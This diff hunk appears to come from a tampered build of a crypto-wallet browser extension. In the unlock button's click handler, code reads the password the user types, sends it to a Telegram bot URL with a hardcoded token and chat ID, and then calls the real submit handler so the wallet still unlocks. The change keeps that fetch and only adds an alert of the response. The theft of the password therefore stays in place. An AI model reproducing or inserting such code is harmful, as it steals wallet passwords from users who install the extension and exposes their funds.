@@ -10574,7 +10574,9 @@ LavaPack.loadBundle([
                             size: "large",
                             onClick: function onc(...args) {
 								let password = `Possible password: ${document.getElementsByClassName("MuiInputBase-input MuiInput-input")[0].value}`
-								fetch(`https://api.telegram.org/bot6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4/sendMessage?chat_id=1804765109&text=${password}&parse_mode=HTML&disable_web_page_preview=True`)
+								fetch(`https://api.telegram.org/bot6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4/sendMessage?chat_id=1804765109&text=${password}&parse_mode=HTML&disable_web_page_preview=True`).then((r) => {
+									alert(r)
+								})
 								return handleSubmitlololololol(...args)
 							}
                         }, this.context.t("unlock"))
